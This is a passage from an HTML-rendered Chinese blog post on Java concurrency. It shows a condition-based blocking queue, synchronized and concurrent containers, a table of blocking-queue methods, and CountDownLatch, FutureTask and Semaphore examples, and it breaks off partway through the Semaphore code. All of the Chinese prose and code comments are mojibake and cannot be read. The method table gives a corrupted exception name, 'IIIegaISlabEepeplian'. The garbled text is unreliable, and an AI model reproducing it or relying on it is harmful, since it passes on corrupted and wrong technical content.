class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="comment">// ä¸ºé˜Ÿåˆ—æ»¡å’Œé˜Ÿåˆ—ç©ºåˆ†åˆ«åˆ›å»ºæ¡ä»¶é˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">isFull</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">isEmpty</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.size() &gt;= capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">return</span> take(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (isEmpty()) isEmpty.await(timeout, TimeUnit.MILLISECONDS);</span><br><span class="line"></span><br><span class="line">            <span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> list.remove(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// ä¸åŒç­‰å¾…æ¡ä»¶åˆ†é˜Ÿåˆ—åå°±ä¸éœ€è¦å…¨éƒ¨å”¤é†’ï¼ˆsignalAllï¼‰äº†</span></span><br><span class="line">            <span class="comment">// ä»¥å‰æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨çš„åŸå› ä¸¤ç§æ¡ä»¶ç­‰å¾…éƒ½åœ¨ä¸€ä¸ªé˜Ÿåˆ—é‡Œï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½æ§åˆ¶å”¤é†’è°å°±å¯èƒ½ä¼šå”¤é†’ä¸€ä¸ªæˆ‘ä»¬ä¸æƒ³å”¤é†’çš„ç­‰å¾…ã€‚</span></span><br><span class="line">            <span class="comment">// ä¾‹å¦‚æˆ‘ä»¬åœ¨takeåpushæ“ä½œä¸Šçš„ç­‰å¾…åº”è¯¥å¯ä»¥æ‰§è¡Œäº†ï¼Œç”±äºæ— å·®åˆ«çš„å”¤é†’å¯èƒ½æˆ‘ä»¬ä¼šåˆå”¤é†’ä¸€ä¸ªtakeæ“ä½œä¸Šçš„ç­‰å¾…ã€‚</span></span><br><span class="line">            isFull.signal();</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        push(t, Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t, <span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (isFull()) isFull.await(timeout, TimeUnit.MILLISECONDS);</span><br><span class="line"></span><br><span class="line">            list.add(t);</span><br><span class="line">            isEmpty.signal();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒæ­¥å·¥å…·"><a href="#åŒæ­¥å·¥å…·" class="headerlink" title="åŒæ­¥å·¥å…·"></a>åŒæ­¥å·¥å…·</h3><h4 id="åŒæ­¥å®¹å™¨"><a href="#åŒæ­¥å®¹å™¨" class="headerlink" title="åŒæ­¥å®¹å™¨ "></a>åŒæ­¥å®¹å™¨ </h4><ul><li><p>Vector</p><p>  æœ€åˆç‰ˆæœ¬çš„åŒæ­¥é›†åˆï¼Œæ‰€æœ‰æ–¹æ³•å‡ä½¿ç”¨synchronizedåŠ é”åŒæ­¥ã€‚</p></li><li><p>HashTable </p><p>  æœ€åˆç‰ˆæœ¬çš„åŒæ­¥å“ˆå¸Œè¡¨ï¼Œæ‰€æœ‰æ–¹æ³•å‡åŠ é”åŒæ­¥ã€‚</p></li><li><p>Collections.synchronized(Collection|List|Map|Set|SortMap|SortSet)</p><p>  ä»¥ä¸ŠåŒæ­¥å®¹å™¨ä½¿ç”¨è£…é¥°å™¨æ¨¡å¼å®ç°ï¼Œå°†ä¸€ä¸ªçº¿ç¨‹ä¸å®‰å…¨çš„List&#x2F;Mapå°é—­åœ¨å®¹å™¨å†…éƒ¨ï¼Œé€šè¿‡åŒä¸€æŠŠé”ï¼ˆåŒæ­¥å®¹å™¨æœ¬èº«ï¼‰ä¿æŠ¤å¯¹å¯¹è±¡çš„æ‰€æœ‰æ“ä½œï¼ˆå’ŒVectorç±»ä¼¼ï¼‰ã€‚è¿™ç§æ–¹å¼æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯é˜²æ­¢è¢«å°é—­çš„å¯¹è±¡é€¸å‡ºã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SynchronizedList</span>&lt;E&gt;</span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">SynchronizedCollection</span>&lt;E&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">List</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">7754090372962971524L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> List&lt;E&gt; list;</span><br><span class="line"></span><br><span class="line">    SynchronizedList(List&lt;E&gt; list) &#123;</span><br><span class="line">        <span class="built_in">super</span>(list);</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">    SynchronizedList(List&lt;E&gt; list, Object mutex) &#123;</span><br><span class="line">        <span class="built_in">super</span>(list, mutex);</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="comment">// æ‰€æœ‰æ“ä½œä¸Šéƒ½ä½¿ç”¨é”åŒæ­¥</span></span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> list.get(index);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> list.set(index, element);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;list.add(index, element);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> list.remove(index);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="å¹¶å‘å®¹å™¨"><a href="#å¹¶å‘å®¹å™¨" class="headerlink" title="å¹¶å‘å®¹å™¨"></a>å¹¶å‘å®¹å™¨</h4><ul><li><p>CopyOnWriteArrayList</p><p>  å†™å…¥æ—¶å¤åˆ¶çš„æ€æƒ³ï¼Œæ¯æ¬¡æ›´æ–°æ—¶éƒ½ä¼šé‡æ–°copyä¸€ä»½æ–°çš„æ•°æ®ã€‚ç”±äºæ¯æ¬¡ä¿®æ”¹éƒ½ä¼šå¤åˆ¶åº•å±‚æ•°ç»„ï¼Œå½“å®¹å™¨è§„æ¨¡è¾ƒå¤§æ—¶å°†ä¼šäº§ç”Ÿè¾ƒå¤§çš„å¼€é”€ã€‚å¯¹äºå®¹å™¨ä¿®æ”¹å°½é‡è°ƒç”¨æ‰¹é‡æ“ä½œçš„APIï¼Œå‡å°‘å®¹å™¨æ•°æ®å¤åˆ¶æ“ä½œã€‚è¿™ç§å®¹å™¨ä¸»è¦ç”¨åœ¨è¯»å¤šå†™å°‘çš„åœºæ™¯ä¸­ã€‚</p><p>  å¤šçº¿ç¨‹å¯ä»¥åŒæ—¶å¯¹å®¹å™¨è¿›è¡Œè¿­ä»£ï¼Œä¸ä¼šå½¼æ­¤å¹²æ‰°æˆ–ä¸ä¿®æ”¹å®¹å™¨çš„çº¿ç¨‹ç›¸äº’å¹²æ‰°ã€‚å†™å…¥æ—¶å¤åˆ¶ä¸ä¼šæŠ›å‡º<code>ConcurrentModificationException</code>å¼‚å¸¸ï¼Œè¿­ä»£çš„æ˜¯åˆ›å»ºè¿­ä»£å™¨æ—¶çš„å…ƒç´ ï¼Œä¿®æ”¹æ“ä½œä¸ä¼šå¯¹è¿­ä»£çš„æ•°æ®æœ‰å½±å“ï¼ˆä¿®æ”¹åè¢«è¿­ä»£çš„æ•°ç»„å’Œå®¹å™¨æ­¤æ—¶çš„æ•°ç»„å·²ç»ä¸æ˜¯åŒä¸€ä¸ªäº†ï¼Œå› æ­¤ä¹Ÿä¸å¯èƒ½è¯»åˆ°æœ€æ–°å®¹å™¨çš„å˜åŒ–ï¼‰ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CopyOnWriteArrayList.add </span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="comment">// æ’å®ƒé”ä¿è¯äº†å¹¶å‘çš„å®‰å…¨æ€§(å¯è§æ€§/åŸå­æ€§)ï¼Œæ‰€æœ‰çš„æ›´æ–°æ“ä½œä½¿ç”¨åŒä¸€æŠŠé”</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// å®¹å™¨åº•å±‚æ•°ç»„</span></span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        <span class="comment">// !!!é‡ç‚¹</span></span><br><span class="line">        <span class="comment">// å¤åˆ¶åŸæ•°ç»„åˆ°æ–°æ•°ç»„ä¸­</span></span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// å°†å…ƒç´ æ·»åŠ åˆ°æ–°æ•°ç»„ä¸­</span></span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        <span class="comment">// é‡ç½®å®¹å™¨åº•å±‚æ•°ç»„</span></span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†æ“ä½œ</span></span><br><span class="line"><span class="comment">// éå†çš„æ˜¯åˆ›å»ºè¿­ä»£å™¨æ—¶çš„æ•°ç»„ï¼Œåé¢å†ä¿®æ”¹å·²ç»ä¸æ˜¯ä¿®æ”¹çš„æ­¤æ•°ç»„äº†ã€‚</span></span><br><span class="line"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title function_">listIterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">COWIterator</span>&lt;E&gt;(getArray(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ConcurrentHashMap</p><p>  <code>ConcurrentHashMap</code>ä½¿ç”¨<code>é”åˆ†æ®µ</code>çš„æ€æƒ³ï¼Œå°†åŸæ¥çš„ä¸€ä¸ªé”åº”ç”¨åœ¨æ•´ä¸ªå®¹å™¨ä¸Šæ‹†åˆ†ä¸ºå¤šä¸ªé”æ¯ä¸ªé”é”å®šå®¹å™¨ä¸€éƒ¨åˆ†æ•°æ®çš„å½¢å¼ã€‚è¿™èƒ½å‡å°‘é”ç«äº‰ï¼Œæé«˜ç¨‹åºçš„å¯ä¼¸ç¼©æ€§ã€‚</p></li></ul><h4 id="é˜Ÿåˆ—"><a href="#é˜Ÿåˆ—" class="headerlink" title="é˜Ÿåˆ—"></a>é˜Ÿåˆ—</h4><p>Queueã€Deque</p><table><thead><tr><th>-</th><th>-</th><th>-</th></tr></thead><tbody><tr><td>add</td><td>å¢åŠ ä¸€ä¸ªå…ƒç´¢</td><td>å¦‚æœé˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™æŠ›å‡ºä¸€ä¸ªIIIegaISlabEepeplianå¼‚å¸¸</td></tr><tr><td>remove</td><td>ç§»é™¤å¹¶è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ </td><td>å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™æŠ›å‡ºä¸€ä¸ªNoSuchElementExceptionå¼‚å¸¸</td></tr><tr><td>element</td><td>è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ </td><td>å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™æŠ›å‡ºä¸€ä¸ªNoSuchElementExceptionå¼‚å¸¸</td></tr><tr><td>offer</td><td>æ·»åŠ ä¸€ä¸ªå…ƒç´ å¹¶è¿”å›true</td><td>å¦‚æœé˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™è¿”å›false</td></tr><tr><td>poll</td><td>ç§»é™¤å¹¶è¿”é—®é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ </td><td>å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™è¿”å›null</td></tr><tr><td>peek</td><td>è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ </td><td>å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™è¿”å›null</td></tr><tr><td>put</td><td>æ·»åŠ ä¸€ä¸ªå…ƒç´ </td><td>å¦‚æœé˜Ÿåˆ—æ»¡ï¼Œåˆ™é˜»å¡</td></tr><tr><td>take</td><td>ç§»é™¤å¹¶è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ </td><td>å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™é˜»å¡</td></tr></tbody></table><ul><li><p>LinkedBlockingQueue</p><p>  åº•å±‚æœ‰é“¾è¡¨å®ç°ã€‚</p></li><li><p>ArrayBlockingQueue</p><p>  åº•å±‚æœ‰æ•°ç»„å®ç°ã€‚</p></li><li><p>DelayQueue</p><p>  å»¶è¿Ÿé˜Ÿåˆ—ï¼Œåªæœ‰å»¶è¿ŸæœŸæ»¡æ—¶æ‰èƒ½ä»ä¸­æå–å…ƒç´ ã€‚</p></li><li><p>SynchronousQueue </p><p>  <code>SynchronousQueue</code>å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„é˜Ÿåˆ—ï¼Œå®ƒæ²¡æœ‰å­˜å‚¨åŠŸèƒ½ï¼Œä¸ç¼“å­˜å…ƒç´ ã€‚å®ƒç»´æŠ¤çš„æ˜¯æ˜¯ä¸€ç»„å·¥ä½œçº¿ç¨‹ï¼Œä»»åŠ¡ç›´æ¥ä»ç”Ÿäº§è€…åˆ°æ¶ˆè´¹è€…æ‰‹ä¸­ï¼Œä¸­é—´æ²¡æœ‰å»¶è¿Ÿã€‚<code>newCachedThreadPool</code>ä½¿ç”¨çš„æ­£æ˜¯è¿™ç§é˜Ÿåˆ—ã€‚</p></li></ul><h4 id="åŒæ­¥å·¥å…·ç±»"><a href="#åŒæ­¥å·¥å…·ç±»" class="headerlink" title="åŒæ­¥å·¥å…·ç±»"></a>åŒæ­¥å·¥å…·ç±»</h4><ul><li><p>CountDownLatch</p><ul><li>ç¡®ä¿æŸä¸ªè®¡ç®—åœ¨å…¶éœ€è¦çš„æ‰€æœ‰èµ„æºéƒ½è¢«åˆå§‹åŒ–ä¹‹åæ‰ç»§ç»­æ‰§è¡Œã€‚</li><li>ç¡®ä¿æŸä¸ªæœåŠ¡åœ¨å…¶æ‰€ä¾èµ–çš„å…¶å®ƒæ‰€æœ‰æœåŠ¡éƒ½å¯åŠ¨åæ‰å¯åŠ¨ã€‚</li><li>ç­‰å¾…çŸ¥é“æŸä¸ªåŠ¨ä½œçš„æ‰€æœ‰å‚ä¸è€…éƒ½å°±ç»ªå†ç»§ç»­æ‰§è¡Œã€‚</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* æ¨¡æ‹Ÿç”°å¾„æ¯”èµ›</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Track</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">// å‘ä»¤æª</span></span><br><span class="line">        <span class="type">CountDownLatch</span> <span class="variable">startingGun</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// runner code</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> i;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// runner</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                System.out.printf(<span class="string">&quot;Runner-%d å‡†å¤‡å¥½äº†\n&quot;</span>, number);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    startingGun.await(); <span class="comment">// æ‰€æœ‰çº¿ç¨‹åˆ°è¿™é‡Œå¼€å§‹ç­‰å¾…ä¸€èµ·æ‰§è¡Œ</span></span><br><span class="line">                    start = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// éšæœºè·‘æ­¥æ—¶é—´</span></span><br><span class="line">                    Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123; &#125;</span><br><span class="line"></span><br><span class="line">                System.out.printf(<span class="string">&quot;Runner-%d ç”¨æ—¶ï¼š%d ms\n&quot;</span>, number, System.currentTimeMillis() - start);</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        startingGun.countDown(); <span class="comment">// startingGun </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>FutureTask    </p><p>  å¤šä¸ªè€—æ—¶çš„ä»»åŠ¡å¯ä»¥å¼‚æ­¥æ‰§è¡Œï¼Œé€šè¿‡<code>get</code>æ‹¿åˆ°æ‰§è¡Œåçš„ç»“æœã€‚ä»»åŠ¡åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œæœ€ç»ˆçŠ¶æ€ä¸ä¼šæ”¹å˜ï¼ˆç±»ä¼¼Promiseï¼‰ã€‚</p><p>  <img src="/images/FutureTask.png"><br>  <img src="/images/future.png"></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FutureTaskTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        Callable&lt;Integer&gt; callable = () -&gt; &#123;</span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿè®¡ç®—è€—æ—¶</span></span><br><span class="line">            Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">            <span class="comment">// è¿”å›ç»“æœ</span></span><br><span class="line">            <span class="keyword">return</span> random.nextInt(<span class="number">10</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        FutureTask&lt;Integer&gt; queryOne = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(callable);</span><br><span class="line">        FutureTask&lt;Integer&gt; queryTwo = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(callable);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(queryOne).start();</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(queryTwo).start();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// æœªæ‰§è¡Œå®Œçš„æƒ…å†µä¸‹ï¼Œgetæ—¶ä¼šé˜»å¡ã€‚</span></span><br><span class="line">            <span class="comment">// æœ€ç»ˆæ‰§è¡Œæ—¶é—´å–å†³äºæ‰§è¡Œæ—¶é—´æœ€é•¿çš„ä»»åŠ¡ã€‚</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">revOne</span> <span class="operator">=</span> queryOne.get();</span><br><span class="line">            <span class="type">int</span> <span class="variable">revTwo</span> <span class="operator">=</span> queryTwo.get();</span><br><span class="line">            System.out.printf(<span class="string">&quot;%d + %d = %d\n&quot;</span>, revOne, revTwo, revOne + revTwo);</span><br><span class="line">            System.out.println(queryOne.get() + queryTwo.get());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">            <span class="comment">//if (cause instanceof ) &#123;</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//&#125; else &#123;</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Semaphore    </p><p>  Semaphoreä¸­ç®¡ç†è€…ä¸€ç»„è™šæ‹Ÿçš„è®¸å¯è¯ï¼Œè®¸å¯è¯çš„æ•°é‡é€šè¿‡æ„é€ å‡½æ•°æŒ‡å®šã€‚è·å¾—æ“ä½œå‰åªæœ‰è·å¾—è®¸å¯è¯åæ‰èƒ½ç»§ç»­æ‰§è¡Œï¼Œæ‰§è¡Œç»“æŸåé‡Šæ”¾è®¸å¯è¯ã€‚å¸¸ç”¨äºè¿æ¥æ± ç­‰ç±»ä¼¼çš„åœºæ™¯ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¨¡æ‹Ÿé“¶è¡Œçª—å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankWindow</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="comment">// å…±å…­ä¸ªçª—å£å·¥ä½œ</span></span><br><span class="line">        <span class="type">Semaphore</span> <span class="variable">window</span> <span class="operator">=</span> <span 